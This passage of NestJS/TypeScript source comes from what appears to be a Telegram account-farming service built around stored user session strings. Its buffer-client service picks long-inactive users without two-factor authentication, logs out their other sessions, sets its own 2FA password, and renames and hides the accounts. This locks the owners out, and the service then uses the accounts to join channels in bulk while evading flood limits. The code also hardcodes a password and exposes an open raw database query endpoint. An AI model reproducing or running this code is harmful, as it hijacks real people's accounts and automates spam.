'../Telegram/Telegram.module';\nimport { ArchivedClientService } from './archived-client.service';\nimport { ArchivedClientController } from './archived-client.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [ArchivedClientController],\n  providers: [ArchivedClientService],\n  exports: [ArchivedClientService]\n})\nexport class ArchivedClientModule { }\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { ClientService } from '../clients/client.service';\nimport { parseError } from '../../utils/parseError';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n@Injectable()\nexport class ArchivedClientService {\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) {}\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.archivedclientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const results: Client[] = await this.archivedclientModel.find().exec();\n        return results\n    }\n\n    async findOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        return user;\n    }\n\n    async fetchOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        if (user) {\n            return user;\n        } else {\n            try {\n                await connectionManager.getClient(mobile, { autoDisconnect: true, handler: false });\n                const newSession = await this.telegramService.createNewSession(mobile);\n                return await this.create({\n                    \"channelLink\": \"default\",\n                    \"clientId\": \"default\",\n                    \"dbcoll\": \"default\",\n                    \"deployKey\": \"default\",\n                    \"link\": \"default\",\n                    \"mainAccount\": \"default\",\n                    promoteRepl: \"default\",\n                    \"name\": \"default\",\n                    \"password\": \"Ajtdmwajt1@\",\n                    \"repl\": \"default\",\n                    \"session\": newSession,\n                    \"username\": \"default\",\n                    \"mobile\": mobile,\n                    product: \"default\",\n                    gpayId: \"default\",\n                    promoteMobile:[],\n                    qrId: \"default\",\n                })\n            } catch (e) {\n                throw new NotFoundException(parseError(e).message);\n            } finally {\n                await connectionManager.unregisterClient(mobile);\n            }\n        }\n    }\n\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto[\"_id\"]\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        console.log({ ...updateClientDto });\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        return updatedUser;\n    }\n\n    async remove(mobile: string): Promise<Client> {\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.archivedclientModel.find(filter).exec();\n    }\n\n    async checkArchivedClients() {\n        await connectionManager.disconnectAll()\n        await sleep(2000);\n        const archivedClients = await this.findAll();\n\n        const clients = await this.clientService.findAll();\n        const clientIds = clients.map(client => client.mobile);\n\n        archivedClients.map(async (document) => {\n            if (!clientIds.includes(document.mobile)) {\n                try {\n                    await connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });\n                    await this.telegramService.updateUsername(document.mobile, '');\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                    await sleep(2000);\n                } catch (error) {\n                    console.log(document.mobile, \" :  false\");\n                    this.remove(document.mobile)\n                } finally{\n                    await connectionManager.unregisterClient(document.mobile);\n                }\n            } else {\n                console.log(\"Number is a Active Client\")\n            }\n        })\n\n        return \"Triggered ArchiveClients check\"\n    }\n\n    async executeQuery(query: any): Promise<any> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            return await this.archivedclientModel.find(query).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { BufferClientService } from './buffer-client.service';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\nimport { BufferClient } from './schemas/buffer-client.schema';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\n\n@ApiTags('Buffer Clients')\n@Controller('bufferclients')\nexport class BufferClientController {\n  constructor(private readonly clientService: BufferClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForBufferClients')\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\n  async joinChannelsforBufferClients(): Promise<string> {\n    return this.clientService.joinchannelForBufferClients();\n  }\n\n  @Get('checkBufferClients')\n  @ApiOperation({ summary: 'Check Buffer Clients' })\n  async checkbufferClients(): Promise<string> {\n    this.clientService.checkBufferClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoBufferClients')\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<BufferClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsBufferClient/:mobile')\n  @ApiOperation({ summary: 'Set as Buffer Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsBufferClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsBufferClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BufferClientService } from './buffer-client.service';\nimport { BufferClientController } from './buffer-client.controller';\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => PromoteClientModule)\n ],\n  controllers: [BufferClientController],\n  providers: [BufferClientService],\n  exports: [BufferClientService]\n})\nexport class BufferClientModule { }\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n\n@Injectable()\nexport class BufferClientService {\n    private readonly logger = new Logger(BufferClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isJoinChannelProcessing: boolean = false;\n    private isLeaveChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 30 seconds\n    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;\n\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n    ) {}\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\n        const newUser = new this.bufferClientModel(bufferClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<BufferClient[]> {\n        return this.bufferClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<BufferClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key);\n    }\n\n    clearBufferMap() {\n        console.log(\"BufferMap cleared\");\n        this.joinChannelMap.clear();\n        this.clearJoinChannelInterval();\n    }\n\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            this.logger.log('Starting join channel process');\n            await connectionManager.disconnectAll();\n\n            // Clear both queues before starting new process\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n\n            await sleep(2000);\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n\n            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);\n\n            if (clients.length > 0) {\n                for (const document of clients) {\n                    try {\n                        const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });\n                        this.logger.log(`Started joining process for mobile: ${document.mobile}`);\n\n                        const channels = await client.channelInfo(true);\n                        this.logger.debug(`Client ${document.mobile} has ${channels.ids.length} existing channels`);\n\n                        await this.update(document.mobile, { channels: channels.ids.length });\n                        this.logger.debug(`Client ${document.mobile} has ${channels.canSendFalseChats.length} channels that can't send messages`);\n\n                        let result = [];\n                        if (channels.canSendFalseCount < 10) {\n                            if (channels.ids.length < 220) {\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                            } else {\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                            }\n                            this.logger.debug(`Adding ${result.length} new channels to join queue for ${document.mobile}`);\n                            this.joinChannelMap.set(document.mobile, result);\n                            this.joinChannelQueue();\n                            await connectionManager.unregisterClient(document.mobile);\n                        } else {\n                            this.logger.warn(`Client ${document.mobile} has too many restricted channels, moving to leave queue: ${channels.canSendFalseChats.length}`);\n                            this.joinChannelMap.delete(document.mobile);\n                            this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);\n                            this.leaveChannelQueue();\n                            await connectionManager.unregisterClient(document.mobile);\n\n                        }\n                        // console.log(\"DbChannelsLen: \", result.length);\n                        // let resp = '';\n                        // this.telegramService.joinChannels(document.mobile, result);\n                    } catch (error) {\n                        if (error.message === \"SESSION_REVOKED\" ||\n                            error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.message === \"USER_DEACTIVATED\" ||\n                            error.message === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${document.mobile}, removing client`, error.stack);\n                            await this.remove(document.mobile);\n                            await connectionManager.unregisterClient(document.mobile);\n                        }\n                        parseError(error)\n                    }\n                }\n            }\n            this.logger.log(`Join channel process initiated for ${clients.length} clients`);\n            return `Initiated Joining channels ${clients.length}`\n        } else {\n            this.logger.warn('Ignored active check buffer channels as active client setup exists');\n        }\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, not starting queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    const channels = this.joinChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);\n                        this.removeFromBufferMap(mobile);\n                        continue;\n                    }\n\n                    const channel = channels.shift();\n                    this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);\n                    this.joinChannelMap.set(mobile, channels);\n\n                    try {\n                        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile} attempting to join channel: @${channel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, channel);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                        this.logger.error(`Error joining channel @${channel.username} for ${mobile}`, errorDetails);\n\n                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);\n                            this.removeFromBufferMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n\n                        if (error.errorMessage === \"SESSION_REVOKED\" ||\n                            error.errorMessage === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in join channel interval', error.stack);\n                this.clearJoinChannelInterval();\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n\n            // Only schedule next run if there are items in the map\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering next join channel process');\n                    this.joinchannelForBufferClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        console.log(\"LeaveMap cleared\");\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, this.LEAVE_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    const channels = this.leaveChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);\n                        this.removeFromLeaveMap(mobile);\n                        continue;\n                    }\n\n                    const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);\n                    this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);\n\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.leaveChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromLeaveMap(mobile);\n                    }\n\n                    try {\n                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile} left channels successfully`);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} Leave Channel ERR: `, false);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in leave channel interval', error.stack);\n                this.clearLeaveChannelInterval();\n            }\n        }, this.LEAVE_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsBufferClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\n            try {\n                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false })\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const bufferClient = {\n                    tgId: user.tgId,\n                    session: user.session,\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await connectionManager.unregisterClient(mobile)\n            return \"Client set as buffer successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkBufferClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await connectionManager.disconnectAll()\n            await sleep(2000);\n            const bufferclients = await this.findAll();\n            let goodIds: string[] = [];\n            const badIds: string[] = [];\n            if (bufferclients.length < 70) {\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const promoteclients = await this.promoteClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const promoteclientIds = promoteclients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of bufferclients) {\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000)\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                            await sleep(2000)\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await connectionManager.unregisterClient(document.mobile)\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile)\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoBufferClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New buffer documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        await sleep(2000);\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const bufferClient = {\n                            tgId: document.tgId,\n                            session: document.session,\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(bufferClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created BufferClient=============\")\n                        await connectionManager.unregisterClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as BufferClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await connectionManager.unregisterClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await connectionManager.unregisterClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForBufferClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 